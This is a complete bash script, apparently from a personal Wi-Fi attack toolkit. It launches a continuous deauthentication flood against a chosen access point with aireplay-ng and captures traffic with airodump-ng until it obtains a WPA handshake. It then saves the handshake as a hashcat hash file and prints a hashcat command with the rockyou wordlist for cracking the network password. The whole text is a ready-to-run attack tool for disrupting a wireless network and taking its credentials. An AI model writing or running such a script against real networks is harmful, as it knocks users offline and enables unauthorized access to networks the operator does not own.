#!/bin/bash
# Continuous Broadcast Deauth Flood with early exit on success
# Usage: ./attack_deauth_flood.sh <BSSID> <CHANNEL> <SSID>

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: ./attack_deauth_flood.sh <BSSID> <CHANNEL> <SSID>"
    exit 1
fi

BSSID=$1
CHANNEL=$2
SSID=$3
MAX_DURATION=180  # 3 minutes max
CHECK_INTERVAL=30  # Check every 30 seconds
CAPTURE_DIR="/home/ov3rr1d3/wifi_arsenal/captures"
SCRIPT_DIR="/home/ov3rr1d3/wifi_arsenal/scripts"

# Sanitize SSID for filename
if [ -z "$SSID" ] || [ "$SSID" = "<hidden>" ]; then
    SSID="hidden"
fi
SAFE_SSID=$(echo "$SSID" | tr ' /:*?"<>|' '_')

# Generate timestamp
TIME_PART=$(date +%I-%M%p | tr 'A-Z' 'a-z')
DATE_PART=$(date +%m-%d-%Y)
TIMESTAMP="${TIME_PART}_${DATE_PART}"

OUTPUT_PREFIX="$CAPTURE_DIR/AP=${SAFE_SSID}_$TIMESTAMP"

echo "[*] METHOD 4: CONTINUOUS DEAUTH FLOOD WITH EARLY EXIT"
echo "[*] Targeting: $BSSID on channel $CHANNEL"
echo "[*] Max duration: ${MAX_DURATION}s (exits early on success)"
echo "[*] Checking every ${CHECK_INTERVAL}s for handshake"
echo ""

# Ensure alfa0 is in monitor mode
echo "[*] Setting alfa0 to monitor mode on channel $CHANNEL..."
$SCRIPT_DIR/mode_manager.sh ensure alfa0 monitor

if [ $? -ne 0 ]; then
    echo "[-] Failed to set monitor mode"
    exit 1
fi

# Set channel
sudo iw dev alfa0 set channel $CHANNEL

# Start capture in background
echo "[*] Starting packet capture..."
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w "$OUTPUT_PREFIX" --output-format pcapng alfa0 >/dev/null 2>&1 &
AIRODUMP_PID=$!

# Wait for airodump to initialize
sleep 3

# Start continuous deauth flood in background
echo "[*] Starting continuous deauth flood..."
sudo aireplay-ng -0 0 -a "$BSSID" alfa0 >/dev/null 2>&1 &
DEAUTH_PID=$!

# Function to cleanup and exit
cleanup() {
    kill $DEAUTH_PID 2>/dev/null
    kill $AIRODUMP_PID 2>/dev/null
    wait $DEAUTH_PID 2>/dev/null
    wait $AIRODUMP_PID 2>/dev/null
    rm -f "${OUTPUT_PREFIX}-01.csv" "${OUTPUT_PREFIX}-01.kismet.csv" "${OUTPUT_PREFIX}-01.kismet.netxml" "${OUTPUT_PREFIX}-01.log.csv" 2>/dev/null
}

# Monitor and check periodically
START_TIME=$(date +%s)
CHECK_NUM=0
TOTAL_CHECKS=$((MAX_DURATION / CHECK_INTERVAL))

while true; do
    sleep $CHECK_INTERVAL
    CHECK_NUM=$((CHECK_NUM + 1))
    ELAPSED=$(($(date +%s) - START_TIME))
    
    echo "[*] Check $CHECK_NUM/$TOTAL_CHECKS (${ELAPSED}s elapsed)..."
    
    # Check for capture file
    cap_file=""
    if [ -f "${OUTPUT_PREFIX}-01.pcapng" ]; then
        cap_file="${OUTPUT_PREFIX}-01.pcapng"
    elif [ -f "${OUTPUT_PREFIX}-01.cap" ]; then
        cap_file="${OUTPUT_PREFIX}-01.cap"
    fi
    
    if [ -n "$cap_file" ]; then
        if $SCRIPT_DIR/check_handshake.sh "$cap_file" "${OUTPUT_PREFIX}.hc22000"; then
            echo ""
            echo "[+] ✓ HANDSHAKE CAPTURED at ${ELAPSED}s!"
            echo "[+] SUCCESS: Hash file ready: ${OUTPUT_PREFIX}.hc22000"
            cleanup
            echo ""
            echo "[*] To crack:"
            echo "    hashcat -m 22000 ${OUTPUT_PREFIX}.hc22000 /usr/share/wordlists/rockyou.txt"
            exit 0
        fi
    fi
    
    # Check if we've exceeded max duration
    if [ $ELAPSED -ge $MAX_DURATION ]; then
        echo "[*] Max duration reached"
        break
    fi
    
    echo "[*] No handshake yet, continuing flood..."
done

echo ""
cleanup

# Final check
echo "[-] FAILED: No valid handshake captured"
exit 1
